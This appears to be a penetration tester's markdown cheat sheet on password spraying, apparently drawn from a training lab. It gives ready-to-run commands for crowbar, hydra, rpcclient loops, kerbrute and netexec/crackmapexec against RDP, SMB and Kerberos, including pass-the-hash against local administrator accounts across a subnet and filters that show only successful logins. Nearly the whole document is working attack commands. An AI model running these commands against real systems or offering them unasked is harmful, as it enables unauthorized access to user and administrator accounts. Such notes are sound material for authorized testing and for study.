-- -
Different ways (tools) to perform password spraying.
### Crowbar
```bash
crowbar -b <protocol> -s <ip/range> -U <userfile> -c '<passwd>'
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
### Hydra
```bash
hydra -L <userlist> -p '<passwd>' <ip> <protocol>
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### O365 
You can password spray directly to O365 if the organization uses it. 
![[O365#^10833c]]
### rpcclient
Loop through the usernames in a username list and try to authenticate via rpcclient, then filter out anything that doesn't have "Authority" in the response. This will filter invalid attempts and only show successful logins
```bash
# generic example
for u in $(cat <userlist>);do rpcclient -U "<passwd>" -c "getusername;quit" <target ip> | grep Authority;done

# specific example
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

^c6d397

### Kerbrute
```bash
kerbrute passwordspray -d <domain> --dc <dc ip> <userlist> <password>
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

^f1c1f5

### netexec
```bash
# filters out invalid login attempts, not super necessary
sudo netexec smb <target ip> -u <userlist> -p <password> | grep +
sudo netexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# validate successful login credentials with the DC
sudo netexec smb <dc ip> -u <username> -p <password>

# target local accounts, not domain accounts
sudo netexec smb --local-auth <subnet> -u <user> -H <hash> | grep +
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```